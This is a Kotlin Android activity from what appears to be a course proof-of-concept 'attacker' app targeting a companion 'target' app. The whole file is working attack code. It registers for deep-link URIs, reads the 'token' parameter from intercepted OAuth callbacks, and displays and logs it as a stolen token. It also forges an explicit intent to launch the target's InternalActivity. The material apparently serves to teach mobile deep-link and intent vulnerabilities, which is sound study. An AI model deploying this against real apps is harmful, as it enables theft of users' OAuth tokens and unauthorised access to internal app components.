package ro.upb.smd.poc.attacker

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat

class MainActivity : AppCompatActivity() {

    private val targetPackage = "ro.upb.smd.poc.target"
    private val targetInternal = "ro.upb.smd.poc.target.InternalActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val bars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(bars.left, bars.top, bars.right, bars.bottom)
            insets
        }

        val statusView = findViewById<TextView>(R.id.status_view)
        val payloadView = findViewById<TextView>(R.id.payload_view)
        val injectBtn = findViewById<Button>(R.id.inject_btn)

        handle(intent, statusView, payloadView)

        injectBtn.setOnClickListener { launchInternal(statusView) }
    }

    override fun onNewIntent(newIntent: Intent) {
        super.onNewIntent(newIntent)
        intent = newIntent
        handle(
            newIntent,
            findViewById(R.id.status_view),
            findViewById(R.id.payload_view),
        )
    }

    private fun handle(i: Intent?, statusView: TextView, payloadView: TextView) {
        val uri: Uri? = i?.data
        when {
            uri == null -> {
                statusView.text = getString(R.string.status_idle)
                payloadView.text = ""
            }
            uri.host == "oauth" -> {
                val token = uri.getQueryParameter("token") ?: "(none)"
                statusView.text = getString(R.string.status_token_stolen)
                payloadView.text = "URI: $uri\n\nSTOLEN TOKEN: $token"
                Log.w("ATTACKER", "Intercepted OAuth callback. token=$token uri=$uri")
            }
            uri.host == "internal" -> {
                statusView.text = getString(R.string.status_intent_forged)
                payloadView.text = "URI: $uri\n\nForwarding explicit intent to:\n$targetPackage/$targetInternal"
                Log.w("ATTACKER", "Forwarding to target's InternalActivity. uri=$uri")
                launchInternal(statusView)
            }
            else -> {
                statusView.text = getString(R.string.status_unknown_uri)
                payloadView.text = "URI: $uri"
            }
        }
    }

    private fun launchInternal(statusView: TextView) {
        val explicit = Intent().apply {
            component = ComponentName(targetPackage, targetInternal)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try {
            startActivity(explicit)
        } catch (t: Throwable) {
            Log.e("ATTACKER", "Explicit launch failed", t)
            statusView.text = getString(R.string.status_inject_failed, t.message ?: "?")
        }
    }
}
